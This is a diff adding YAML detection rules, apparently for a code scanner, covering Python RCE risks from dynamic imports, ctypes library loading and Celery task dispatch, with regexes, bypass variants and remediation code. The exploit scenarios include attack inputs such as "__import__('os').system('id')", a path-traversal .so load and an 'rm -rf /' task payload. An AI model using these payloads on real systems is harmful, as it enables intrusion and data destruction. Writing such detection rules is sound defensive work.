+        pattern: 'pkgutil\s*\.\s*(?:find_loader|get_loader)\s*\(\s*(?:module|name|plugin|request\.)'
+        description: "pkgutil loader with user-controlled module name"
+    anti_patterns:
+      - '__import__\s*\(\s*[`\x27"][a-zA-Z][a-zA-Z0-9_.]+[`\x27"]\s*\)'
+      - 'importlib\.import_module\s*\(\s*[`\x27"][a-zA-Z][a-zA-Z0-9_.]+[`\x27"]\s*\)'
+      - '__import__\s*\(\s*(?:MODULE|PACKAGE|LIB)\s*\)'
+      - 'importlib\.import_module\s*\(\s*(?:config|settings)\.\w+'
+      - '@pytest\.fixture'
+      - 'def\s+test_\w+'
+      - '@mock\.patch'
+      - 'unittest\.mock'
+      - 'mock\.MagicMock'
+      - 'class\s+\w+Test(?:Case)?\s*\('
+      - '(?:#|""").*(?:test|example|demo)'
+      - 'importlib\.import_module\s*\(\s*[`\x27"](?:django|flask|celery|numpy|pandas)\.'
+      - 'importlib\.resources\.'
+      - 'importlib\.metadata\.'
+      - 'entry_points\s*\('
+    bypass_variants:
+      - description: "import os/subprocess for command execution"
+        pattern: '__import__\s*\(\s*[`\x27"](?:os|subprocess|commands|pty)[`\x27"]\s*\)\s*\.\s*(?:system|popen|Popen|spawn)'
+      - description: "builtins traversal to __import__"
+        pattern: '(?:__builtins__|builtins)\s*[\.\[].*?(?:__import__|import_module)'
+      - description: "getattr chain to reach __import__"
+        pattern: 'getattr\s*\(\s*getattr\s*\([^)]*\)\s*,\s*[`\x27"]__import__[`\x27"]\s*\)'
+      - description: "importlib.util for file-based module loading"
+        pattern: 'importlib\.util\.spec_from_file_location\s*\(\s*(?:name|module)\s*,\s*(?:path|file)\s*\)'
+    evasion_indicators:
+      - "Module name manipulation to load dangerous modules"
+      - "Attribute chain traversal via getattr"
+      - "builtins access to __import__"
+      - "importlib.util for file-based loading"
+      - "Package relative import manipulation"
+    encoding_variants:
+      - type: "string_concatenation"
+        pattern: '__import__\s*\(\s*[`\x27"]o[`\x27"]\s*\+\s*[`\x27"]s[`\x27"]\s*\)'
+      - type: "unicode_module_name"
+        pattern: '__import__\s*\(.*?\\u[0-9A-Fa-f]{4}'
+      - type: "base64_module_name"
+        pattern: '__import__\s*\(\s*(?:base64\.b64decode|b64decode)\s*\('
+    multi_function_chain_patterns:
+      - "request.args['module'] -> __import__(module) -> getattr(mod, 'function')()"
+      - "request.json['plugin'] -> importlib.import_module(plugin) -> plugin.execute()"
+      - "request.form['handler'] -> __import__(handler) -> handler.process(data)"
+      - "user input -> module name construction -> importlib -> function call"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Dynamic import enables loading os/subprocess for command execution"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.args.get('module')"
+        sink: "__import__(module)"
+        through: "query parameter to dynamic import"
+      - source: "request.json['plugin']"
+        sink: "importlib.import_module(plugin)"
+        through: "JSON body to importlib"
+      - source: "request.form['handler']"
+        sink: "__import__(handler).process()"
+        through: "form data to module loading and execution"
+    impact: |
+      - Loading of os, subprocess, or other system modules for command execution.
+      - Access to filesystem via loaded modules.
+      - Network access for data exfiltration.
+      - Denial of service via resource-intensive module loading.
+      - Code execution via module initialization side effects.
+    remediation: |
+      1. Use an allowlist of permitted module names:
+         ```python
+         ALLOWED_PLUGINS = {
+             'csv_handler': 'myapp.plugins.csv_handler',
+             'json_handler': 'myapp.plugins.json_handler',
+             'xml_handler': 'myapp.plugins.xml_handler',
+         }
+
+         def safe_load_plugin(plugin_name: str):
+             module_path = ALLOWED_PLUGINS.get(plugin_name)
+             if module_path is None:
+                 raise ValueError(f'Plugin {plugin_name} not allowed')
+             return importlib.import_module(module_path)
+         ```
+      2. Never pass user input directly to __import__ or importlib.import_module.
+      3. Map user-provided names to a fixed set of approved modules.
+      4. Use entry_points for plugin discovery instead of dynamic imports.
+      5. Validate module names against a strict pattern.
+    references:
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://docs.python.org/3/library/importlib.html"
+      - "https://docs.python.org/3/library/functions.html#import__"
+    context_awareness:
+      surrounding_context_patterns:
+        - '@app\.route\s*\('
+        - 'def\s+\w+\s*\(\s*request'
+        - 'class\s+\w+View\s*\('
+        - 'import\s+importlib'
+      taint_source_indicators:
+        - 'request\.args\.get\s*\(\s*[`\x27"](?:module|plugin|handler|name)'
+        - 'request\.json\s*[\.\[]'
+        - 'request\.form\.get\s*\('
+        - 'request\.GET\.get\s*\('
+      taint_sink_indicators:
+        - '__import__\s*\('
+        - 'importlib\.import_module\s*\('
+        - 'importlib\.util\.spec_from_file_location\s*\('
+        - 'pkgutil\.find_loader\s*\('
+      sanitization_patterns:
+        - 'ALLOWED_PLUGINS'
+        - 'ALLOWED_MODULES'
+        - 'plugin_allowlist'
+        - 'validated_module_name'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + module_access_risk)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A plugin system loads handlers dynamically:
+
+        @app.route('/api/process/<handler>')
+        def process(handler):
+            module = __import__(f'handlers.{handler}')
+            result = module.process(request.json)
+            return jsonify(result)
+
+        Attacker sends:
+        GET /api/process/os
+
+        This loads the os module. Combined with attribute access:
+        __import__('os').system('id')
+      example_payload: "os"
+      attacker_objective: "Load dangerous modules for code/command execution"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "RCE-PY-003"
+        - "RCE-PY-001"
+
+  # --------------------------------------------------------------------------
+  # RCE-PY-005: ctypes/CDLL abuse
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-PY-005"
+    title: "ctypes/CDLL with User-Controlled Library Path"
+    description: >
+      Detects usage of Python's ctypes module (ctypes.CDLL, ctypes.cdll,
+      ctypes.windll, ctypes.oledll) where the shared library path is derived
+      from user-controlled input. Loading a user-specified shared library
+      executes its initialization code (constructor functions, DllMain),
+      enabling arbitrary native code execution. This bypasses Python-level
+      sandboxes since the loaded code runs as native machine code.
+    language: python
+    category: rce
+    severity: High
+    confidence: 0.89
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - ctypes
+      - cdll
+      - native-code
+      - shared-library
+      - python
+      - ffi
+      - critical
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'ctypes\s*\.\s*CDLL\s*\(\s*(?:request\s*\.\s*(?:args|form|json|GET|POST)|lib_path|library|path|user_input|data|name)'
+        description: "ctypes.CDLL with user-controlled library path"
+      - type: regex
+        pattern: 'ctypes\s*\.\s*cdll\s*\.\s*LoadLibrary\s*\(\s*(?:request\.|lib_path|library|path|user_input|data|name)'
+        description: "ctypes.cdll.LoadLibrary with user-controlled path"
+      - type: regex
+        pattern: 'ctypes\s*\.\s*(?:windll|oledll)\s*\.\s*LoadLibrary\s*\(\s*(?:request\.|lib_path|library|path|user_input|data|name)'
+        description: "Windows-specific ctypes DLL loading with user input"
+      - type: regex
+        pattern: 'ctypes\s*\.\s*CDLL\s*\(\s*f[`\x27"].*?\{(?:request\.|lib|path|name|user|input|data)'
+        description: "ctypes.CDLL with f-string containing user-controlled path"
+      - type: regex
+        pattern: 'ctypes\s*\.\s*(?:WinDLL|PyDLL|OleDLL)\s*\(\s*(?:request\.|lib_path|library|path|user_input|data|name)'
+        description: "ctypes DLL classes with user-controlled library path"
+      - type: regex
+        pattern: '(?:lib_path|library_path|so_path|dll_path)\s*=\s*request\s*\.\s*(?:args|form|json|GET|POST)\s*[\.\[][\s\S]{0,200}ctypes\s*\.\s*(?:CDLL|cdll|WinDLL)'
+        description: "Library path from request used in ctypes loading"
+      - type: regex
+        pattern: 'ctypes\s*\.\s*util\s*\.\s*find_library\s*\(\s*(?:request\.|name|lib|user_input)'
+        description: "ctypes.util.find_library with user-controlled library name"
+      - type: regex
+        pattern: 'cffi\s*\.\s*FFI\s*\(\s*\)[\s\S]{0,300}\.dlopen\s*\(\s*(?:request\.|lib_path|path|name|user_input)'
+        description: "CFFI dlopen with user-controlled library path"
+    anti_patterns:
+      - 'ctypes\.CDLL\s*\(\s*[`\x27"][a-zA-Z0-9/._-]+\.(so|dll|dylib)[`\x27"]'
+      - 'ctypes\.CDLL\s*\(\s*[`\x27"]lib[a-zA-Z]+\.so'
+      - 'ctypes\.cdll\.LoadLibrary\s*\(\s*[`\x27"][a-zA-Z0-9/._-]+[`\x27"]'
+      - 'ctypes\.util\.find_library\s*\(\s*[`\x27"][a-zA-Z]+[`\x27"]'
+      - '@pytest\.fixture'
+      - 'def\s+test_\w+'
+      - '@mock\.patch.*ctypes'
+      - 'unittest\.mock'
+      - 'class\s+\w+Test(?:Case)?\s*\('
+      - '(?:#|""").*(?:test|example|demo)'
+      - 'ctypes\.CDLL\s*\(\s*(?:LIB_PATH|NATIVE_LIB|Constants\.)'
+      - 'ctypes\.CDLL\s*\(\s*os\.path\.join\s*\(\s*(?:LIB_DIR|BASE_DIR)'
+      - 'ctypes\.CDLL\s*\(\s*None\s*\)'
+      - 'RTLD_GLOBAL'
+    bypass_variants:
+      - description: "Path traversal to load arbitrary shared libraries"
+        pattern: 'ctypes\.CDLL\s*\(\s*[`\x27"](?:\.\./)+[`\x27"]\s*\+\s*(?:name|path|lib)'
+      - description: "Uploaded malicious shared library loading"
+        pattern: 'ctypes\.CDLL\s*\(\s*(?:upload_path|file_path|saved_path)\s*\)'
+      - description: "LD_PRELOAD-style library injection"
+        pattern: 'os\.environ\s*\[\s*[`\x27"]LD_PRELOAD[`\x27"]\s*\]\s*=\s*(?:request\.|user_input|path)'
+      - description: "Symlink-based library replacement"
+        pattern: 'os\.symlink\s*\(\s*(?:request\.|user|attacker)[\s\S]{0,200}ctypes\.CDLL'
+    evasion_indicators:
+      - "Path traversal to reach attacker-controlled .so/.dll"
+      - "Uploaded file loaded as shared library"
+      - "LD_PRELOAD/DYLD_INSERT_LIBRARIES manipulation"
+      - "Symlink creation pointing to malicious library"
+      - "Temporary file creation with library code"
+    encoding_variants:
+      - type: "path_traversal"
+        pattern: 'ctypes\.CDLL\s*\(.*?(?:\.\./|\.\.\\\\){2,}'
+      - type: "null_byte"
+        pattern: 'ctypes\.CDLL\s*\(.*?(?:%00|\\x00|\\0)'
+      - type: "url_encoding"
+        pattern: 'ctypes\.CDLL\s*\(.*?%(?:2[fF]|2[eE]|5[cC])'
+    multi_function_chain_patterns:
+      - "file upload -> save to disk -> ctypes.CDLL(uploaded_path)"
+      - "request.json['lib'] -> path construction -> ctypes.CDLL(lib_path)"
+      - "user input -> find_library(name) -> ctypes.CDLL(found_path)"
+      - "request -> lib name -> os.path.join -> CDLL"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: true
+      escalation_vector: "Native code execution bypasses all Python-level security controls"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.json['library']"
+        sink: "ctypes.CDLL(library)"
+        through: "JSON body to ctypes library loading"
+      - source: "uploaded_file.save(path)"
+        sink: "ctypes.CDLL(path)"
+        through: "file upload then load as shared library"
+      - source: "request.args.get('lib')"
+        sink: "ctypes.cdll.LoadLibrary(lib)"
+        through: "query parameter to library loading"
+    impact: |
+      - Arbitrary native code execution at the process level.
+      - Complete bypass of Python-level sandboxes and restrictions.
+      - Full system access with application's OS privileges.
+      - Memory corruption and exploitation of host system.
+      - Persistent backdoor via loaded native library.
+    remediation: |
+      1. Never load shared libraries from user-controlled paths:
+         ```python
+         import ctypes
+         import os
+
+         ALLOWED_LIBS = {
+             'image': '/usr/lib/x86_64-linux-gnu/libpng.so',
+             'crypto': '/usr/lib/x86_64-linux-gnu/libcrypto.so',
+         }
+
+         def safe_load_library(lib_name: str) -> ctypes.CDLL:
+             lib_path = ALLOWED_LIBS.get(lib_name)
+             if lib_path is None:
+                 raise ValueError(f'Library {lib_name} not allowed')
+             if not os.path.isfile(lib_path):
+                 raise FileNotFoundError(f'Library {lib_path} not found')
+             return ctypes.CDLL(lib_path)
+         ```
+      2. Use a fixed mapping of allowed library names to paths.
+      3. Validate library paths are within expected directories.
+      4. Never load uploaded files as shared libraries.
+      5. Restrict filesystem write access to prevent library injection.
+    references:
+      - "https://docs.python.org/3/library/ctypes.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'import\s+ctypes'
+        - 'from\s+ctypes\s+import'
+        - '@app\.route\s*\('
+        - 'def\s+\w+\s*\(\s*request'
+      taint_source_indicators:
+        - 'request\.args\.get\s*\(\s*[`\x27"](?:lib|library|path|module)'
+        - 'request\.json\s*[\.\[]'
+        - 'request\.files\s*[\.\[]'
+        - 'uploaded_file\.\w+'
+      taint_sink_indicators:
+        - 'ctypes\.CDLL\s*\('
+        - 'ctypes\.cdll\.LoadLibrary\s*\('
+        - 'ctypes\.WinDLL\s*\('
+        - 'cffi.*\.dlopen\s*\('
+      sanitization_patterns:
+        - 'ALLOWED_LIBS'
+        - 'ALLOWED_LIBRARIES'
+        - 'lib_allowlist'
+        - 'validate_lib_path\s*\('
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + native_code_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Python service allows loading processing plugins as shared libraries:
+
+        @app.route('/api/process', methods=['POST'])
+        def process():
+            lib_name = request.json['library']
+            lib = ctypes.CDLL(f'/opt/libs/{lib_name}.so')
+            result = lib.process(data)
+            return jsonify({'result': result})
+
+        Attacker uploads a malicious .so file and requests:
+        POST /api/process
+        Body: {"library": "../../tmp/uploads/malicious"}
+
+        The malicious library's constructor function executes arbitrary native code.
+      example_payload: "../../tmp/uploads/malicious"
+      attacker_objective: "Load malicious native code via ctypes for system compromise"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "RCE-PY-001"
+        - "RCE-PY-004"
+
+  # --------------------------------------------------------------------------
+  # RCE-PY-006: Celery task with user-controlled arguments
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-PY-006"
+    title: "Celery Task with User-Controlled Arguments"
+    description: >
+      Detects usage of Celery task dispatching where task names, arguments,
+      or serialized data come from user-controlled input. Celery is the most
+      popular distributed task queue in Python. An attacker who can control
+      task names can invoke arbitrary registered tasks, and controlling
+      arguments can lead to command injection within task handlers. The
+      pickle serializer (historical default) enables arbitrary code execution
+      via deserialization attacks.
+    language: python
+    category: rce
+    severity: High
+    confidence: 0.86
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - celery
+      - task-queue
+      - deserialization
+      - pickle
+      - python
+      - distributed
+      - worker
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '(?:celery_app|app|celery)\s*\.\s*send_task\s*\(\s*(?:request\s*\.\s*(?:args|form|json|GET|POST)|task_name|name|user_input|data)'
+        description: "Celery send_task with user-controlled task name"
+      - type: regex
+        pattern: '\.(?:delay|apply_async|apply|s|si|signature)\s*\(\s*(?:request\s*\.\s*(?:args|form|json)|user_input|data|args|kwargs)'
+        description: "Celery task dispatch with user-controlled arguments"
+      - type: regex
+        pattern: '(?:task_name|name)\s*=\s*request\s*\.\s*(?:args|form|json|GET|POST)\s*[\.\[][\s\S]{0,200}(?:send_task|apply_async|delay)\s*\('
+        description: "Task name from request used in Celery dispatch"
+      - type: regex
+        pattern: 'CELERY_ACCEPT_CONTENT\s*=\s*\[.*?[`\x27"]pickle[`\x27"]'
+        description: "Celery configured to accept pickle serialization (dangerous)"
+      - type: regex
+        pattern: 'CELERY_TASK_SERIALIZER\s*=\s*[`\x27"]pickle[`\x27"]'
+        description: "Celery using pickle task serializer"
+      - type: regex
+        pattern: 'celery\s*\.\s*(?:signature|Signature)\s*\(\s*(?:request\.|task_name|name|user_input|data)'
+        description: "Celery Signature with user-controlled task name"
+      - type: regex
+        pattern: '(?:chain|group|chord)\s*\(\s*(?:request\.|tasks|user_tasks|data)[\s\S]{0,200}(?:\.delay|\.apply_async)\s*\('
+        description: "Celery chain/group/chord with user-controlled task list"
+      - type: regex
+        pattern: '(?:task_args|task_kwargs|args|kwargs)\s*=\s*request\s*\.\s*(?:json|form|data)\s*[\.\[][\s\S]{0,200}(?:\.delay|\.apply_async|send_task)\s*\('
+        description: "Task arguments from request used in Celery dispatch"
+    anti_patterns:
+      - '\.delay\s*\(\s*[`\x27"][^`\x27"]+[`\x27"]\s*\)'
+      - '\.delay\s*\(\s*(?:user\.id|item\.id|order\.id)\s*\)'
+      - '\.apply_async\s*\(\s*args\s*=\s*\[\s*(?:user\.id|item\.id)\s*\]'
+      - 'send_task\s*\(\s*[`\x27"]myapp\.tasks\.\w+[`\x27"]'
+      - '@pytest\.fixture'
+      - 'def\s+test_\w+'
+      - '@mock\.patch.*celery'
+      - 'unittest\.mock'
+      - 'class\s+\w+Test(?:Case)?\s*\('
+      - '(?:#|""").*(?:test|example|demo)'
+      - '@(?:celery_app|app|shared_task)\.task'
+      - 'CELERY_TASK_SERIALIZER\s*=\s*[`\x27"]json[`\x27"]'
+      - 'CELERY_ACCEPT_CONTENT\s*=\s*\[\s*[`\x27"]json[`\x27"]\s*\]'
+      - '\.delay\s*\(\s*(?:pk|id|uuid)\s*='
+    bypass_variants:
+      - description: "Pickle deserialization via task serializer"
+        pattern: 'CELERY_(?:TASK_SERIALIZER|ACCEPT_CONTENT|RESULT_SERIALIZER)\s*=.*?pickle'
+      - description: "Arbitrary task name injection for invoking any registered task"
+        pattern: 'send_task\s*\(\s*(?:request\.|user_input|name)\s*[,)]'
+      - description: "Task argument injection for command execution in handler"
+        pattern: '\.delay\s*\(\s*(?:request\.|user_input|command|cmd)\s*[,)]'
+      - description: "Flower/monitoring API abuse for task injection"
+        pattern: '(?:flower|celery_flower)[\s\S]{0,200}(?:api|task)[\s\S]{0,200}(?:request\.|user_input)'
+    evasion_indicators:
+      - "Pickle serialization enabling arbitrary code execution"
+      - "Task name injection to invoke any registered task"
+      - "Argument injection into task handlers"
+      - "Celery Flower API for unauthorized task dispatch"
+      - "Custom serializer injection"
+    encoding_variants:
+      - type: "pickle_payload"
+        pattern: 'pickle\.(?:loads|load)\s*\(\s*(?:request\.|data|payload|body)'
+      - type: "base64_pickle"
+        pattern: 'pickle\.loads\s*\(\s*base64\.b64decode\s*\('
+      - type: "yaml_deserialization"
+        pattern: 'yaml\.(?:load|unsafe_load)\s*\(\s*(?:request\.|data|payload)'
+    multi_function_chain_patterns:
+      - "request.json['task'] -> celery.send_task(task, args) -> arbitrary task execution"
+      - "request.json['args'] -> registered_task.delay(*args) -> command injection in handler"
+      - "request -> pickle serialized body -> celery worker -> code execution"
+      - "API endpoint -> task dispatch -> worker -> os.system in task"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: false
+      escalation_vector: "Celery task injection enables code execution on worker nodes"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.json['task_name']"
+        sink: "celery.send_task(task_name, args)"
+        through: "JSON body to Celery task dispatch"
+      - source: "request.json['args']"
+        sink: "my_task.delay(*args)"
+        through: "user-controlled arguments to task"
+      - source: "request.data (pickle)"
+        sink: "celery worker deserialization"
+        through: "pickle-serialized request body to Celery worker"
+    impact: |
+      - Arbitrary task execution on Celery worker nodes.
+      - Code execution via pickle deserialization on workers.
+      - Command injection via task argument manipulation.
+      - Denial of service through task queue flooding.
+      - Lateral movement to worker nodes in distributed deployments.
+    remediation: |
+      1. Use JSON serialization and validate task names:
+         ```python
+         ALLOWED_TASKS = {
+             'send_email': 'myapp.tasks.send_email',
+             'process_upload': 'myapp.tasks.process_upload',
+             'generate_report': 'myapp.tasks.generate_report',
+         }
+
+         @app.route('/api/dispatch', methods=['POST'])
+         def dispatch_task():
+             task_key = request.json.get('task')
+             task_name = ALLOWED_TASKS.get(task_key)
+             if task_name is None:
+                 return jsonify({'error': 'Task not allowed'}), 400
+
+             # Validate and sanitize arguments
+             args = validate_task_args(task_key, request.json.get('args', []))
+             celery.send_task(task_name, args=args)
+             return jsonify({'status': 'dispatched'})
+
+         # In celeryconfig.py:
+         CELERY_TASK_SERIALIZER = 'json'
+         CELERY_ACCEPT_CONTENT = ['json']
+         CELERY_RESULT_SERIALIZER = 'json'
+         ```
+      2. Never use pickle as the Celery serializer.
+      3. Use JSON or msgpack serialization only.
+      4. Validate task names against an allowlist.
+      5. Sanitize and validate all task arguments.
+    references:
+      - "https://docs.celeryq.dev/en/stable/userguide/security.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'from\s+celery\s+import'
+        - 'import\s+celery'
+        - '@(?:celery_app|app|shared_task)\.task'
+        - '@app\.route\s*\('
+        - 'def\s+\w+\s*\(\s*request'
+      taint_source_indicators:
+        - 'request\.json\s*[\.\[]\s*[`\x27"](?:task|name|args|kwargs|command)'
+        - 'request\.form\.get\s*\(\s*[`\x27"]task'
+        - 'request\.data'
+        - 'request\.GET\.\w+'
+      taint_sink_indicators:
+        - '\.send_task\s*\('
+        - '\.delay\s*\('
+        - '\.apply_async\s*\('
+        - '\.signature\s*\('
+        - 'chain\s*\('
+        - 'group\s*\('
+      sanitization_patterns:
+        - 'ALLOWED_TASKS'
+        - 'task_allowlist'
+        - 'validate_task_name\s*\('
+        - 'CELERY_TASK_SERIALIZER.*json'
+        - 'CELERY_ACCEPT_CONTENT.*json'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + serialization_risk)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Django API allows users to dispatch background tasks:
+
+        @api_view(['POST'])
+        def dispatch(request):
+            task_name = request.data.get('task')
+            args = request.data.get('args', [])
+            celery_app.send_task(task_name, args=args)
+            return Response({'status': 'dispatched'})
+
+        Celery is configured with pickle serialization.
+        Attacker sends:
+        POST /api/dispatch
+        Body: {"task": "myapp.tasks.admin_reset", "args": ["admin", "hacked123"]}
+
+        Or exploits pickle deserialization for direct code execution.
+      example_payload: '{"task": "myapp.tasks.run_command", "args": ["rm -rf /"]}'
+      attacker_objective: "Execute arbitrary tasks or code on Celery worker nodes"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "RCE-PY-001"
+        - "RCE-PY-002"
+        - "RCE-PY-003"
